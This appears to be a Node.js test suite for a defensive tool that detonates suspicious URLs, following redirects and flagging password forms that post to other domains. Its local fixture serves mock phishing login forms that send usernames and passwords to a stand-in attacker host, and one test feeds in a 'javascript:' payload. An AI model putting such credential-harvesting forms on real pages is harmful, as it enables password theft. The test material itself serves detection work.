import { test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { detonate } from "./detonate.js";

// Local-only fixture server — never hits a real domain (§13 safety rules).
//
// This is NOT the "Daytona can't reach localhost" case (CLAUDE.md trap #9,
// PLAN.md §12): that rule is about the *production* fake portal needing to
// be reachable by a real, remote Daytona sandbox during a live detonation.
// This fixture is an in-process Node http.createServer() used only to unit
// test detonate.js's own redirect/HTML-parsing logic in isolation — nothing
// here runs in, or is reached by, a sandbox. T-014 has no Daytona
// integration yet (that's separate future work, §11 T-035).
//
// detonate() refuses loopback/private/link-local targets by default (SSRF
// guard, Rule 2880752) — every call below against this fixture passes
// `allowPrivateNetworkTargets: true` to opt back in explicitly, so the
// default-refusal behavior stays real and is exercised by the test right
// after this comment, not silently bypassed for every test in this file.
function startFixtureServer() {
  const server = http.createServer((req, res) => {
    if (req.url === "/start") {
      res.writeHead(302, { Location: "/login" });
      res.end();
      return;
    }
    if (req.url === "/login") {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(`
        <html><body>
          <form method="POST" action="http://evil.invalid/collect">
            <input type="text" name="username">
            <input type="password" name="password">
          </form>
        </body></html>
      `);
      return;
    }
    if (req.url === "/plain") {
      res.writeHead(200, { "Content-Type": "text/plain" });
      res.end("just text, no forms");
      return;
    }
    if (req.url === "/uppercase-html") {
      res.writeHead(200, { "Content-Type": "TEXT/HTML; charset=utf-8" });
      res.end(`<html><body><form method="POST" action="http://evil.invalid/collect"><input type="password" name="p"></form></body></html>`);
      return;
    }
    if (req.url === "/malformed-form") {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(`
        <html><body>
          <form method="POST" action="http://[">
            <input type="password" name="p">
          </form>
          <form method="POST" action="http://evil.invalid/collect">
            <input type="password" name="p">
          </form>
        </body></html>
      `);
      return;
    }
    if (req.url === "/bad-redirect") {
      res.writeHead(302, { Location: "http://[" });
      res.end();
      return;
    }
    if (req.url === "/slow") {
      setTimeout(() => {
        res.writeHead(200, { "Content-Type": "text/plain" });
        res.end("too slow");
      }, 500);
      return;
    }
    if (req.url === "/big") {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end("x".repeat(1000));
      return;
    }
    res.writeHead(404);
    res.end();
  });
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server)));
}

test("refuses loopback/private targets by default (SSRF guard)", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/start`);
    assert.match(result.error, /refused private\/internal network target/);
    assert.deepEqual(result.redirect_chain, []);
  } finally {
    server.close();
  }
});

test("follows redirect chain and flags cross-domain password form", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/start`, { allowPrivateNetworkTargets: true });
    assert.equal(result.redirect_chain.length, 2);
    assert.equal(result.redirect_chain[0].status, 302);
    assert.equal(result.redirect_chain[1].status, 200);
    assert.equal(result.forms.length, 1);
    assert.equal(result.forms[0].asks_password, true);
    assert.equal(result.forms[0].cross_domain, true);
    assert.match(result.summary, /asks for a password/);
  } finally {
    server.close();
  }
});

test("non-HTML response returns the full documented shape, including summary", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/plain`, { allowPrivateNetworkTargets: true });
    assert.deepEqual(result.forms, []);
    assert.equal(typeof result.summary, "string");
    assert.match(result.summary, /not HTML/);
    assert.ok(result.final_url);
    assert.ok(result.redirect_chain);
  } finally {
    server.close();
  }
});

test("refuses non-http(s) schemes", async () => {
  const result = await detonate("javascript:alert(1)");
  assert.match(result.error, /refused non-http/);
});

test("malformed start URL returns a structured error, not a throw", async () => {
  const result = await detonate("not a url");
  assert.equal(typeof result, "object");
  assert.match(result.error, /Invalid URL|TypeError/);
  assert.deepEqual(result.redirect_chain, []);
});

test("connection failure (nothing listening) returns a structured error, not a throw", async () => {
  // Bind, grab the port, close it — nothing is listening on it any more.
  const server = await startFixtureServer();
  const { port } = server.address();
  await new Promise((resolve) => server.close(resolve));

  const result = await detonate(`http://127.0.0.1:${port}/start`, { allowPrivateNetworkTargets: true });
  assert.equal(typeof result, "object");
  assert.ok(result.error, "expected a structured error, got: " + JSON.stringify(result));
  assert.deepEqual(result.redirect_chain, []);
});

test("timeout returns a structured error, not a throw", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/slow`, { timeoutMs: 50, allowPrivateNetworkTargets: true });
    assert.ok(result.error, "expected a structured error, got: " + JSON.stringify(result));
  } finally {
    server.close();
  }
});

test("malformed redirect Location returns a structured error, not a throw", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/bad-redirect`, { allowPrivateNetworkTargets: true });
    assert.ok(result.error, "expected a structured error, got: " + JSON.stringify(result));
    assert.equal(result.redirect_chain.length, 1);
  } finally {
    server.close();
  }
});

test("one malformed form action doesn't abort analysis of the others", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/malformed-form`, { allowPrivateNetworkTargets: true });
    assert.equal(result.forms.length, 2);
    assert.equal(result.forms[0].action_invalid, true);
    assert.equal(result.forms[1].asks_password, true);
    assert.equal(result.forms[1].cross_domain, true);
  } finally {
    server.close();
  }
});

test("HTML content-type check is case-insensitive", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/uppercase-html`, { allowPrivateNetworkTargets: true });
    assert.equal(result.forms.length, 1);
    assert.equal(result.forms[0].asks_password, true);
  } finally {
    server.close();
  }
});

test("oversized response body is rejected before parsing, not buffered unbounded", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/big`, { maxBodyBytes: 100, allowPrivateNetworkTargets: true });
    assert.match(result.error, /byte limit/);
  } finally {
    server.close();
  }
});
